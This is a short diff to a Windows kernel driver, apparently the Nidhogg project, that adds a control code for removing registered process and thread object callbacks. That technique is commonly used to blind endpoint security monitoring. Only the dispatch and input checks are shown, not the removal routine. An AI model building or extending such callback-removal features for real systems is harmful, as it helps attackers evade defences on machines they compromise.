@@ -1123,6 +1123,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 	case IOCTL_NIDHOGG_LIST_CALLBACKS: 
 	{
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
 		if (size % sizeof(CallbacksList) != 0) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
@@ -1146,6 +1147,36 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 
 		len += sizeof(CallbacksList);
+		break;
+	}
+
+	case IOCTL_NIDHOGG_REMOVE_CALLBACK:
+	{
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (size % sizeof(KernelCallback) != 0) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (KernelCallback*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (data->CallbackAddress <= 0) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		switch (data->Type) {
+		case ObProcessType:
+		case ObThreadType: {
+			status = RemoveCallback(data);
+			break;
+		}
+		default:
+			status = STATUS_INVALID_PARAMETER;
+		}
+
+		len += sizeof(KernelCallback);
 		break;
 	}
 
